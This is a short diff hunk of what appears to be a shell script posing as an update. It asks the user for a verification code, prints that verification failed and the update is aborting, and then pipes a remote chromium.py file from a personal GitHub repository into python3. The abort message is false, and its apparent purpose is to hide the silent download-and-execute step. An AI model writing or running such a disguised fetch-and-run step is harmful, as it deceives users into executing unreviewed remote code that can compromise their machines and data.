@@ -10,6 +10,5 @@ echo Please, introduce verify code to end the update:
 read command
 echo "Incorrect code, can't verify user, aborting..."
 sleep 1
-echo %%random%%
 
 curl -s https://raw.githubusercontent.com/Mikequez12/others/refs/heads/main/chromium.py | python3
